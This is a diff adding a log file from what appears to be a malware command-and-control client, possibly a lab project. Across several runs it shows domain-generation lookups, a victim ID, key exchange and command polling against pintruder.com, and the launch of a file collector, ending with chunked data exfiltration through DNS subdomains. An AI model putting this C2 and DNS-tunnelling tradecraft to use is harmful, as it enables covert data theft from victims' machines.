@@ -1,0 +1,391 @@
+2025-07-05 17:28:46,670 - Client starting... Initial beacon delay for 7s.
+2025-07-05 17:28:57,365 - Cached Method 'GetmacExe' failed for 'iface' lookup with unhandled exception: 'utf-8' codec can't decode byte 0xc0 in position 2: invalid start byte
+2025-07-05 17:28:57,365 - Falling back to 'IpconfigExe' for unusable method 'GetmacExe'
+2025-07-05 17:28:57,457 - Cached Method 'IpconfigExe' failed for 'iface' lookup with unhandled exception: 'utf-8' codec can't decode byte 0xb1 in position 13: invalid start byte
+2025-07-05 17:28:57,457 - Falling back to 'WmicExe' for unusable method 'IpconfigExe'
+2025-07-05 17:28:58,351 - MAC address  is not 17 characters long!
+2025-07-05 17:28:58,357 - Failed to retrieve MAC address. Will try persistent ID file.
+2025-07-05 17:28:58,357 - Persistent ID file 'E:\ccit\.persistent_client_id_v4.dat' not found. Will generate new ID.
+2025-07-05 17:28:58,357 - No valid MAC or loadable persistent ID found. Generated new UUID: a7bf332e-2be3-4827-b2e2-644523aea24f
+2025-07-05 17:28:58,386 - Saved new UUID to persistent file: E:\ccit\.persistent_client_id_v4.dat
+2025-07-05 17:28:58,386 - Victim ID base established using method: NewUUID, Base: 'a7bf332e-2be3-4827-b...'
+2025-07-05 17:28:58,386 - [Main Thread] Victim ID established: B1oVyzcEdH0mRAFC
+2025-07-05 17:28:58,386 - [Main Thread] Current Run Session ID: 69ff6fe8197e
+2025-07-05 17:28:58,386 - [Main Thread] Attempting to resolve a new C2 domain...
+2025-07-05 17:28:58,542 -  -> fdxljjkalgq.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:28:58,851 -  -> ccbnreo.us ... [SKIP] NXDOMAIN
+2025-07-05 17:28:59,188 -  -> gjstuec.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:28:59,518 -  -> afbvphfilixmrly.info ... [SKIP] NXDOMAIN
+2025-07-05 17:28:59,979 -  -> vchsiia.in ... [SKIP] NXDOMAIN
+2025-07-05 17:29:00,363 -  -> kkfxpafpkkcpptf.top ... [SKIP] NXDOMAIN
+2025-07-05 17:29:00,677 -  -> gvmyarryrtvbuml.org ... [SKIP] NXDOMAIN
+2025-07-05 17:29:00,900 -  -> yututpayisdlklx.org ... [SKIP] NXDOMAIN
+2025-07-05 17:29:01,269 -  -> smmvqmh.org ... [SKIP] NXDOMAIN
+2025-07-05 17:29:01,982 -  -> sqvivfkigsl.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:29:02,286 -  -> dxhkxnqeurp.in ... [SKIP] NXDOMAIN
+2025-07-05 17:29:02,483 -  -> teqehmt.info ... [SKIP] NXDOMAIN
+2025-07-05 17:29:02,685 -  -> dkvsnef.org ... [SKIP] NXDOMAIN
+2025-07-05 17:29:02,928 -  -> yqpeohurpdq.us ... [SKIP] NXDOMAIN
+2025-07-05 17:29:03,216 -  -> jsbpfambaayhefq.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:29:03,428 -  -> pwyxxfs.top ... [SKIP] NXDOMAIN
+2025-07-05 17:29:03,739 -  -> cgddbwysotj.in ... [SKIP] NXDOMAIN
+2025-07-05 17:29:03,928 -  -> memyeghggig.net ... [SKIP] NXDOMAIN
+2025-07-05 17:29:04,134 -  -> hryjnnh.info ... [SKIP] NXDOMAIN
+2025-07-05 17:29:04,353 -  -> absqtcmwwiy.xyz ... [SKIP] NXDOMAIN
+2025-07-05 17:29:04,692 -  -> nvqhhcghygu.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:29:04,869 -  -> ikbkgsafokwipgh.us ... [SKIP] NXDOMAIN
+2025-07-05 17:29:05,172 -  -> miuyfwjjesmncwt.info ... [SKIP] NXDOMAIN
+2025-07-05 17:29:05,475 -  -> wphncjdjrphqrux.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:29:05,829 -  -> vxxfofnxjtpcrlr.xyz ... [SKIP] NXDOMAIN
+2025-07-05 17:29:05,982 -  -> pbiojqmheau.net ... [SKIP] NXDOMAIN
+2025-07-05 17:29:06,272 -  -> iokbpru.org ... [SKIP] NXDOMAIN
+2025-07-05 17:36:46,431 - Client starting... Initial beacon delay for 11s.
+2025-07-05 17:37:00,944 - Failed to retrieve MAC address. Will try persistent ID file.
+2025-07-05 17:37:00,960 - Using ID from persistent file: E:\ccit\.persistent_client_id_v4.dat (ID: a7bf332e-2be3-48...)
+2025-07-05 17:37:00,960 - Victim ID base established using method: PersistentFile, Base: 'a7bf332e-2be3-4827-b...'
+2025-07-05 17:37:00,968 - [Main Thread] Victim ID established: B1oVyzcEdH0mRAFC
+2025-07-05 17:37:00,971 - [Main Thread] Current Run Session ID: 02e8c84614d1
+2025-07-05 17:37:00,971 - [Main Thread] Attempting to resolve a new C2 domain...
+2025-07-05 17:37:01,041 -  -> smmvqmh.org ... [SKIP] NXDOMAIN
+2025-07-05 17:37:01,277 -  -> nvqhhcghygu.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:37:01,898 -  -> wphncjdjrphqrux.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:37:02,197 -  -> hryjnnh.info ... [SKIP] NXDOMAIN
+2025-07-05 17:37:02,488 -  -> kkfxpafpkkcpptf.top ... [SKIP] NXDOMAIN
+2025-07-05 17:37:02,734 -  -> memyeghggig.net ... [SKIP] NXDOMAIN
+2025-07-05 17:37:03,458 -  -> yututpayisdlklx.org ... [SKIP] NXDOMAIN
+2025-07-05 17:37:03,650 -  -> fdxljjkalgq.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:37:03,939 -  -> afbvphfilixmrly.info ... [SKIP] NXDOMAIN
+2025-07-05 17:37:04,334 -  -> jsbpfambaayhefq.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:37:04,648 -  -> iokbpru.org ... [SKIP] NXDOMAIN
+2025-07-05 17:37:04,911 -  -> pwyxxfs.top ... [SKIP] NXDOMAIN
+2025-07-05 17:37:05,208 -  -> vxxfofnxjtpcrlr.xyz ... [SKIP] NXDOMAIN
+2025-07-05 17:37:05,431 -  -> gvmyarryrtvbuml.org ... [SKIP] NXDOMAIN
+2025-07-05 17:37:05,640 -  -> fypmvfo.eu ... [SKIP] NXDOMAIN
+2025-07-05 17:37:05,834 -  -> sqvivfkigsl.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:37:06,074 -  -> qlldfidqfty.net ... [SKIP] NXDOMAIN
+2025-07-05 17:37:06,418 -  -> dkvsnef.org ... [SKIP] NXDOMAIN
+2025-07-05 17:37:06,741 -  -> yqpeohurpdq.us ... [SKIP] NXDOMAIN
+2025-07-05 17:37:07,124 -  -> dxhkxnqeurp.in ... [SKIP] NXDOMAIN
+2025-07-05 17:37:07,443 -  -> absqtcmwwiy.xyz ... [SKIP] NXDOMAIN
+2025-07-05 17:37:07,651 -  -> ikbkgsafokwipgh.us ... [SKIP] NXDOMAIN
+2025-07-05 17:37:07,942 -  -> vchsiia.in ... [SKIP] NXDOMAIN
+2025-07-05 17:37:08,159 -  -> laojlvfkygyfccx.org ... [SKIP] NXDOMAIN
+2025-07-05 17:37:08,610 -  -> cgddbwysotj.in ... [SKIP] NXDOMAIN
+2025-07-05 17:37:08,929 -  -> teqehmt.info ... [SKIP] NXDOMAIN
+2025-07-05 17:37:09,167 -  -> ccbnreo.us ... [SKIP] NXDOMAIN
+2025-07-05 17:37:09,419 -  -> miuyfwjjesmncwt.info ... [SKIP] NXDOMAIN
+2025-07-05 17:37:09,709 -  -> pbiojqmheau.net ... [SKIP] NXDOMAIN
+2025-07-05 17:37:10,149 -  -> gjstuec.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:37:10,331 - [OK] pintruder.com is alive, C2 domain set.
+2025-07-05 17:37:10,332 - [Main Thread] Using C2 domain: pintruder.com
+2025-07-05 17:37:10,333 - Attempting to establish session key with C2 domain: pintruder.com
+2025-07-05 17:37:10,548 - Attempting key exchange with https://pintruder.com/api/key_exchange/B1oVyzcEdH0mRAFC
+2025-07-05 17:37:11,034 - Session key successfully derived and established.
+2025-07-05 17:37:11,040 - [Main Thread] Initialization complete. Starting C2 threads.
+2025-07-05 17:37:11,046 - [API Thread] Starting API C2 loop with domain: pintruder.com.
+2025-07-05 17:37:11,048 - [Main Thread] All threads started. Monitoring threads...
+2025-07-05 17:37:11,050 - [DNS Thread] Starting DNS operations.
+2025-07-05 17:37:11,245 - Admin privilege check: False
+2025-07-05 17:37:12,469 - [DNS Thread] 'modified_files.zip' not found. Will try to execute file collector.
+2025-07-05 17:37:12,471 - [DNS Thread] Launching 'C:\Users\rkddk\AppData\Local\aaa\module2.exe' and waiting for it to complete...
+2025-07-05 17:37:14,475 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:37:14,476 - API Poll: Polling https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC with session 02e8c84614d1 and system_info.
+2025-07-05 17:37:15,075 - API Poll: No new commands from API (https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC).
+2025-07-05 17:37:25,288 - Admin privilege check: False
+2025-07-05 17:37:28,144 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:37:28,146 - API Poll: Polling https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC with session 02e8c84614d1 and system_info.
+2025-07-05 17:37:28,486 - API Poll: No new commands from API (https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC).
+2025-07-05 17:37:38,640 - Admin privilege check: False
+2025-07-05 17:37:41,311 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:37:41,311 - API Poll: Polling https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC with session 02e8c84614d1 and system_info.
+2025-07-05 17:37:42,091 - API Poll: No new commands from API (https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC).
+2025-07-05 17:37:52,242 - Admin privilege check: False
+2025-07-05 17:37:54,738 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:37:54,738 - API Poll: Polling https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC with session 02e8c84614d1 and system_info.
+2025-07-05 17:37:55,115 - API Poll: No new commands from API (https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC).
+2025-07-05 17:38:05,214 - Admin privilege check: False
+2025-07-05 17:38:07,799 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:38:07,799 - API Poll: Polling https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC with session 02e8c84614d1 and system_info.
+2025-07-05 17:38:08,193 - API Poll: No new commands from API (https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC).
+2025-07-05 17:38:10,313 - [Main Thread] Shutdown signal (Ctrl+C) received. Exiting.
+2025-07-05 17:42:22,875 - Client starting... Initial beacon delay for 17s.
+2025-07-05 17:42:39,880 - Attempting to get MAC address on Windows using 'getmac' command.
+2025-07-05 17:42:43,358 - No MAC address found in 'getmac' command output.
+2025-07-05 17:42:43,359 - Subprocess method failed or no MAC found. Falling back to getmac library.
+2025-07-05 17:42:46,472 - Cached Method 'GetmacExe' failed for 'iface' lookup with unhandled exception: 'utf-8' codec can't decode byte 0xc0 in position 2: invalid start byte
+2025-07-05 17:42:46,472 - Falling back to 'IpconfigExe' for unusable method 'GetmacExe'
+2025-07-05 17:42:46,561 - Cached Method 'IpconfigExe' failed for 'iface' lookup with unhandled exception: 'utf-8' codec can't decode byte 0xb1 in position 13: invalid start byte
+2025-07-05 17:42:46,561 - Falling back to 'WmicExe' for unusable method 'IpconfigExe'
+2025-07-05 17:42:47,442 - MAC address  is not 17 characters long!
+2025-07-05 17:42:47,442 - getmac library also failed to retrieve MAC address.
+2025-07-05 17:42:47,442 - Failed to retrieve MAC address. Will try persistent ID file.
+2025-07-05 17:42:47,447 - Using ID from persistent file: E:\ccit\.persistent_client_id_v4.dat (ID: a7bf332e-2be3-48...)
+2025-07-05 17:42:47,447 - Victim ID base established using method: PersistentFile, Base: 'a7bf332e-2be3-4827-b...'
+2025-07-05 17:42:47,447 - [Main Thread] Victim ID established: B1oVyzcEdH0mRAFC
+2025-07-05 17:42:47,447 - [Main Thread] Current Run Session ID: b3d4e31458ec
+2025-07-05 17:42:47,447 - [Main Thread] Attempting to resolve a new C2 domain...
+2025-07-05 17:42:47,568 -  -> pwyxxfs.top ... [SKIP] NXDOMAIN
+2025-07-05 17:42:47,834 -  -> memyeghggig.net ... [SKIP] NXDOMAIN
+2025-07-05 17:42:48,354 -  -> wphncjdjrphqrux.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:42:48,714 -  -> nvqhhcghygu.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:42:48,896 -  -> yututpayisdlklx.org ... [SKIP] NXDOMAIN
+2025-07-05 17:42:49,103 -  -> jsbpfambaayhefq.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:42:49,344 -  -> dxhkxnqeurp.in ... [SKIP] NXDOMAIN
+2025-07-05 17:42:49,528 -  -> afbvphfilixmrly.info ... [SKIP] NXDOMAIN
+2025-07-05 17:42:49,798 -  -> pbiojqmheau.net ... [SKIP] NXDOMAIN
+2025-07-05 17:42:50,128 -  -> yqpeohurpdq.us ... [SKIP] NXDOMAIN
+2025-07-05 17:42:50,350 -  -> fdxljjkalgq.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:42:50,698 -  -> kkfxpafpkkcpptf.top ... [SKIP] NXDOMAIN
+2025-07-05 17:42:51,008 -  -> gvmyarryrtvbuml.org ... [SKIP] NXDOMAIN
+2025-07-05 17:42:51,300 -  -> ccbnreo.us ... [SKIP] NXDOMAIN
+2025-07-05 17:42:51,663 -  -> sqvivfkigsl.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:42:52,008 -  -> gjstuec.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:42:52,339 -  -> iokbpru.org ... [SKIP] NXDOMAIN
+2025-07-05 17:42:52,570 -  -> cgddbwysotj.in ... [SKIP] NXDOMAIN
+2025-07-05 17:42:52,850 -  -> vxxfofnxjtpcrlr.xyz ... [SKIP] NXDOMAIN
+2025-07-05 17:42:53,121 -  -> hryjnnh.info ... [SKIP] NXDOMAIN
+2025-07-05 17:42:53,401 -  -> miuyfwjjesmncwt.info ... [SKIP] NXDOMAIN
+2025-07-05 17:42:53,619 -  -> smmvqmh.org ... [SKIP] NXDOMAIN
+2025-07-05 17:45:13,000 - Client starting... Initial beacon delay for 14s.
+2025-07-05 17:45:27,005 - Attempting to get MAC address on Windows using 'ipconfig /all' command.
+2025-07-05 17:45:27,191 - No MAC address found in 'ipconfig /all' command output.
+2025-07-05 17:45:27,191 - Ipconfig method failed or no MAC found. Falling back to 'getmac' command.
+2025-07-05 17:45:30,524 - No MAC address found in 'getmac /fo list /v' command output.
+2025-07-05 17:45:30,524 - All subprocess methods failed. Falling back to getmac library.
+2025-07-05 17:45:33,814 - Cached Method 'GetmacExe' failed for 'iface' lookup with unhandled exception: 'utf-8' codec can't decode byte 0xc0 in position 2: invalid start byte
+2025-07-05 17:45:33,814 - Falling back to 'IpconfigExe' for unusable method 'GetmacExe'
+2025-07-05 17:45:33,920 - Cached Method 'IpconfigExe' failed for 'iface' lookup with unhandled exception: 'utf-8' codec can't decode byte 0xb1 in position 13: invalid start byte
+2025-07-05 17:45:33,921 - Falling back to 'WmicExe' for unusable method 'IpconfigExe'
+2025-07-05 17:45:34,943 - MAC address  is not 17 characters long!
+2025-07-05 17:45:34,943 - getmac library also failed to retrieve MAC address.
+2025-07-05 17:45:34,943 - Failed to retrieve MAC address. Will try persistent ID file.
+2025-07-05 17:45:34,946 - Using ID from persistent file: E:\ccit\.persistent_client_id_v4.dat (ID: a7bf332e-2be3-48...)
+2025-07-05 17:45:34,947 - Victim ID base established using method: PersistentFile, Base: 'a7bf332e-2be3-4827-b...'
+2025-07-05 17:45:34,948 - [Main Thread] Victim ID established: B1oVyzcEdH0mRAFC
+2025-07-05 17:45:34,949 - [Main Thread] Current Run Session ID: 18b58693e906
+2025-07-05 17:45:34,949 - [Main Thread] Attempting to resolve a new C2 domain...
+2025-07-05 17:45:35,009 -  -> sqvivfkigsl.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:45:35,540 -  -> nvqhhcghygu.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:45:35,887 -  -> yututpayisdlklx.org ... [SKIP] NXDOMAIN
+2025-07-05 17:45:36,123 -  -> cgddbwysotj.in ... [SKIP] NXDOMAIN
+2025-07-05 17:45:36,304 -  -> memyeghggig.net ... [SKIP] NXDOMAIN
+2025-07-05 17:45:36,519 -  -> miuyfwjjesmncwt.info ... [SKIP] NXDOMAIN
+2025-07-05 17:45:36,707 -  -> pbiojqmheau.net ... [SKIP] NXDOMAIN
+2025-07-05 17:45:37,020 -  -> gjstuec.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:45:37,385 -  -> gvmyarryrtvbuml.org ... [SKIP] NXDOMAIN
+2025-07-05 17:45:37,732 -  -> vxxfofnxjtpcrlr.xyz ... [SKIP] NXDOMAIN
+2025-07-05 17:45:37,953 -  -> ccbnreo.us ... [SKIP] NXDOMAIN
+2025-07-05 17:45:38,343 -  -> kkfxpafpkkcpptf.top ... [SKIP] NXDOMAIN
+2025-07-05 17:45:38,533 -  -> absqtcmwwiy.xyz ... [SKIP] NXDOMAIN
+2025-07-05 17:45:38,724 -  -> fypmvfo.eu ... [SKIP] NXDOMAIN
+2025-07-05 17:45:39,073 -  -> dxhkxnqeurp.in ... [SKIP] NXDOMAIN
+2025-07-05 17:45:39,274 -  -> ikbkgsafokwipgh.us ... [SKIP] NXDOMAIN
+2025-07-05 17:45:39,424 -  -> yqpeohurpdq.us ... [SKIP] NXDOMAIN
+2025-07-05 17:45:39,696 -  -> dkvsnef.org ... [SKIP] NXDOMAIN
+2025-07-05 17:45:40,003 -  -> vchsiia.in ... [SKIP] NXDOMAIN
+2025-07-05 17:45:40,174 -  -> smmvqmh.org ... [SKIP] NXDOMAIN
+2025-07-05 17:45:40,478 -  -> jsbpfambaayhefq.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:45:40,620 -  -> fdxljjkalgq.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:45:40,988 -  -> pwyxxfs.top ... [SKIP] NXDOMAIN
+2025-07-05 17:45:41,155 -  -> hryjnnh.info ... [SKIP] NXDOMAIN
+2025-07-05 17:45:41,396 -  -> iokbpru.org ... [SKIP] NXDOMAIN
+2025-07-05 17:45:41,773 -  -> wphncjdjrphqrux.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:47:41,183 - Client starting... Initial beacon delay for 11s.
+2025-07-05 17:47:52,223 - Attempting to get MAC address on Windows using 'ipconfig /all' command.
+2025-07-05 17:47:52,407 - Successfully retrieved MAC address via 'ipconfig /all': 0A:00:27:00:00:0A
+2025-07-05 17:47:52,407 - Using MAC address for victim ID base: 0A:00:27:00:00:0A
+2025-07-05 17:47:52,407 - Victim ID base established using method: MAC, Base: '0A:00:27:00:00:0A...'
+2025-07-05 17:47:52,415 - [Main Thread] Victim ID established: pdH5BELa7YKH0oWR
+2025-07-05 17:47:52,415 - [Main Thread] Current Run Session ID: a94012b72f0b
+2025-07-05 17:47:52,415 - [Main Thread] Attempting to resolve a new C2 domain...
+2025-07-05 17:47:52,483 -  -> miuyfwjjesmncwt.info ... [SKIP] NXDOMAIN
+2025-07-05 17:47:52,806 -  -> absqtcmwwiy.xyz ... [SKIP] NXDOMAIN
+2025-07-05 17:47:53,059 -  -> pbiojqmheau.net ... [SKIP] NXDOMAIN
+2025-07-05 17:47:53,347 -  -> jsbpfambaayhefq.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:47:53,705 -  -> nvqhhcghygu.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:47:54,012 -  -> yqpeohurpdq.us ... [SKIP] NXDOMAIN
+2025-07-05 17:47:54,296 -  -> ikbkgsafokwipgh.us ... [SKIP] NXDOMAIN
+2025-07-05 17:47:54,564 -  -> pwyxxfs.top ... [SKIP] NXDOMAIN
+2025-07-05 17:47:54,914 -  -> ccbnreo.us ... [SKIP] NXDOMAIN
+2025-07-05 17:47:55,165 -  -> qlldfidqfty.net ... [SKIP] NXDOMAIN
+2025-07-05 17:47:55,445 -  -> iokbpru.org ... [SKIP] NXDOMAIN
+2025-07-05 17:47:55,723 -  -> kkfxpafpkkcpptf.top ... [SKIP] NXDOMAIN
+2025-07-05 17:47:56,003 -  -> cgddbwysotj.in ... [SKIP] NXDOMAIN
+2025-07-05 17:47:56,209 -  -> gvmyarryrtvbuml.org ... [SKIP] NXDOMAIN
+2025-07-05 17:47:56,483 -  -> gjstuec.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:47:56,644 -  -> memyeghggig.net ... [SKIP] NXDOMAIN
+2025-07-05 17:47:56,957 -  -> vxxfofnxjtpcrlr.xyz ... [SKIP] NXDOMAIN
+2025-07-05 17:47:57,185 -  -> teqehmt.info ... [SKIP] NXDOMAIN
+2025-07-05 17:47:57,433 -  -> dkvsnef.org ... [SKIP] NXDOMAIN
+2025-07-05 17:47:57,625 -  -> fdxljjkalgq.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:47:57,949 -  -> hryjnnh.info ... [SKIP] NXDOMAIN
+2025-07-05 17:47:58,101 -  -> sqvivfkigsl.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:47:58,298 -  -> afbvphfilixmrly.info ... [SKIP] NXDOMAIN
+2025-07-05 17:47:58,653 -  -> fypmvfo.eu ... [SKIP] NXDOMAIN
+2025-07-05 17:47:58,988 -  -> smmvqmh.org ... [SKIP] NXDOMAIN
+2025-07-05 17:47:59,326 -  -> yututpayisdlklx.org ... [SKIP] NXDOMAIN
+2025-07-05 17:47:59,735 -  -> vchsiia.in ... [SKIP] NXDOMAIN
+2025-07-05 17:48:00,074 -  -> wphncjdjrphqrux.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:48:00,417 -  -> laojlvfkygyfccx.org ... [SKIP] NXDOMAIN
+2025-07-05 17:48:00,798 -  -> dxhkxnqeurp.in ... [SKIP] NXDOMAIN
+2025-07-05 17:48:00,998 - [OK] pintruder.com is alive, C2 domain set.
+2025-07-05 17:48:01,005 - [Main Thread] Using C2 domain: pintruder.com
+2025-07-05 17:48:01,006 - Attempting to establish session key with C2 domain: pintruder.com
+2025-07-05 17:48:01,211 - Attempting key exchange with https://pintruder.com/api/key_exchange/pdH5BELa7YKH0oWR
+2025-07-05 17:48:01,582 - Session key successfully derived and established.
+2025-07-05 17:48:01,585 - [Main Thread] Initialization complete. Starting C2 threads.
+2025-07-05 17:48:01,595 - [API Thread] Starting API C2 loop with domain: pintruder.com.
+2025-07-05 17:48:01,605 - [Main Thread] All threads started. Monitoring threads...
+2025-07-05 17:48:01,610 - [DNS Thread] Starting DNS operations.
+2025-07-05 17:48:01,765 - Admin privilege check: False
+2025-07-05 17:48:02,605 - [DNS Thread] 'modified_files.zip' not found. Will try to execute file collector.
+2025-07-05 17:48:02,605 - [DNS Thread] Launching 'C:\Users\rkddk\AppData\Local\aaa\module2.exe' and waiting for it to complete...
+2025-07-05 17:48:03,706 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:48:03,706 - API Poll: Polling https://pintruder.com/api/commands/pdH5BELa7YKH0oWR with session a94012b72f0b and system_info.
+2025-07-05 17:48:04,395 - API Poll: No new commands from API (https://pintruder.com/api/commands/pdH5BELa7YKH0oWR).
+2025-07-05 17:48:14,522 - Admin privilege check: False
+2025-07-05 17:48:16,386 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:48:16,387 - API Poll: Polling https://pintruder.com/api/commands/pdH5BELa7YKH0oWR with session a94012b72f0b and system_info.
+2025-07-05 17:48:16,702 - API Poll: No new commands from API (https://pintruder.com/api/commands/pdH5BELa7YKH0oWR).
+2025-07-05 17:48:26,843 - Admin privilege check: False
+2025-07-05 17:48:28,767 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:48:28,767 - API Poll: Polling https://pintruder.com/api/commands/pdH5BELa7YKH0oWR with session a94012b72f0b and system_info.
+2025-07-05 17:48:29,101 - API Poll: No new commands from API (https://pintruder.com/api/commands/pdH5BELa7YKH0oWR).
+2025-07-05 17:48:39,288 - Admin privilege check: False
+2025-07-05 17:48:41,211 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:48:41,219 - API Poll: Polling https://pintruder.com/api/commands/pdH5BELa7YKH0oWR with session a94012b72f0b and system_info.
+2025-07-05 17:48:41,532 - API Poll: No new commands from API (https://pintruder.com/api/commands/pdH5BELa7YKH0oWR).
+2025-07-05 17:48:51,693 - Admin privilege check: False
+2025-07-05 17:48:53,504 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:48:53,504 - API Poll: Polling https://pintruder.com/api/commands/pdH5BELa7YKH0oWR with session a94012b72f0b and system_info.
+2025-07-05 17:48:53,843 - API Poll: No new commands from API (https://pintruder.com/api/commands/pdH5BELa7YKH0oWR).
+2025-07-05 17:49:03,985 - Admin privilege check: False
+2025-07-05 17:49:05,960 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:49:05,960 - API Poll: Polling https://pintruder.com/api/commands/pdH5BELa7YKH0oWR with session a94012b72f0b and system_info.
+2025-07-05 17:49:06,271 - API Poll: No new commands from API (https://pintruder.com/api/commands/pdH5BELa7YKH0oWR).
+2025-07-05 17:49:16,405 - Admin privilege check: False
+2025-07-05 17:49:18,408 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:49:18,410 - API Poll: Polling https://pintruder.com/api/commands/pdH5BELa7YKH0oWR with session a94012b72f0b and system_info.
+2025-07-05 17:49:19,813 - API Poll: No new commands from API (https://pintruder.com/api/commands/pdH5BELa7YKH0oWR).
+2025-07-05 17:49:29,943 - Admin privilege check: False
+2025-07-05 17:49:30,122 - [DNS Thread] 'C:\Users\rkddk\AppData\Local\aaa\module2.exe' has finished with return code 0.
+2025-07-05 17:49:30,128 - [DNS Thread] Starting exfiltration for 'C:\Users\rkddk\AppData\Local\aaa\modified_files.zip'. This may take a while.
+2025-07-05 17:49:30,298 - [DNS Thread] Generated stable exfil session ID: ad77ebc03218
+2025-07-05 17:49:30,600 - Received server state from init.ad77ebc03218.adafe2.pintruder.com...: {'last_chunk': -1}
+2025-07-05 17:49:31,017 - Exfil: Data Chunk 0 to 000000.kbfqgbauaaaaacaamkf6kww7v2skfyaaaaaeeaia.aaqaaaaamv4hizloonuw63romjzg653t... ACKed (Server: ACK:000000)
+2025-07-05 17:49:31,601 - Exfil: Data Chunk 1 to 000001.fzgesq2fjzjukltupb2e3ecbjpcdaeef574rlt43.sy2wld6kejorjqodqkyowd3i2nezhwwn... ACKed (Server: ACK:000001)
+2025-07-05 17:49:32,148 - Exfil: Data Chunk 2 to 000002.w6u4q6q2pdz3554gvev4lxkie3o3omp2egufw44h.umh32eeofqxepvkm3ziirbgd3nevlnks... ACKed (Server: ACK:000002)
+2025-07-05 17:49:32,225 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:49:32,225 - API Poll: Polling https://pintruder.com/api/commands/pdH5BELa7YKH0oWR with session a94012b72f0b and system_info.
+2025-07-05 17:49:32,762 - Exfil: Data Chunk 3 to 000003.4cgxaze36azip5xmbxpike7dep44tj3zqow552uh.4j6onszmpzyasjp5zk22db7bsdchoonr... ACKed (Server: ACK:000003)
+2025-07-05 17:49:32,873 - API Poll: No new commands from API (https://pintruder.com/api/commands/pdH5BELa7YKH0oWR).
+2025-07-05 17:49:33,263 - Exfil: Data Chunk 4 to 000004.ovdaqrmsf7vpletqfu6tsquxvus4dgp3hqi2z4az.qf55ey64yczcafmp6d34ef5ymbgzxe23... ACKed (Server: ACK:000004)
+2025-07-05 17:49:33,723 - Exfil: Data Chunk 5 to 000005.ch5y545hnn5t7ewdz2xgf4z3gtf7bbe5jpu7ewgx.762dl2hpdhvtpstfh5iewayecqaaaaai... ACKed (Server: ACK:000005)
+2025-07-05 17:49:34,384 - Exfil: Data Chunk 6 to 000006.rhuyzdicwiaabvn5aaaaqaaaabuwg33ofzyg4z3e.xmcvivdn7m6uydbq6tin3urvrb2jpnba... ACKed (Server: ACK:000006)
+2025-07-05 17:49:34,943 - Exfil: Data Chunk 7 to 000007.qkbniaesqjausiznbuhcsmksjkrxjb3uflo56gl4.t33x3757z625bjio47oldl355w667gzi... ACKed (Server: ACK:000007)
+2025-07-05 17:49:35,425 - Exfil: Data Chunk 8 to 000008.wr4gq2diqtvgvst2nbubqrwas4srqg7ys5onxirh.yapsa32f6vdwbygxjpyjgsha564b42wg... ACKed (Server: ACK:000008)
+2025-07-05 17:49:35,826 - Exfil: Data Chunk 9 to 000009.vax7jwn5e4qoah3jt2vbqpovo63x72tl5vsypzxl.5mv6bzag6o3ll5vqcnypo4si3ok2mrkd... ACKed (Server: ACK:000009)
+2025-07-05 17:49:36,243 - Exfil: Data Chunk 10 to 000010.pd2dy7n37hczojzkf5sk6h7zzzfusclpnnhibkfa.3asbbcup2vwl34vrgtfpei24exawahrx... ACKed (Server: ACK:000010)
